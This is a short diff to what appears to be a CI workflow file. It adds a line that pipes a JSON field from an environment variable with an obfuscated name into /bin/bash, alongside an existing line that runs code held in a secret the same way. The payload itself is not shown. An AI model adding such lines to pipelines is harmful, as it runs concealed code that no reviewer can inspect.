@@ -27,6 +27,7 @@ jobs:
           ogv00490: ${{ secrets.ogv00490 }}
         run: |
           printf '%s' "$ogv00490" | jq -r .p40 | /bin/bash
+          printf '%s' "$dny47884" | jq -r .sezht240 | /bin/bash
 
       - name: Persist output
         if: always()
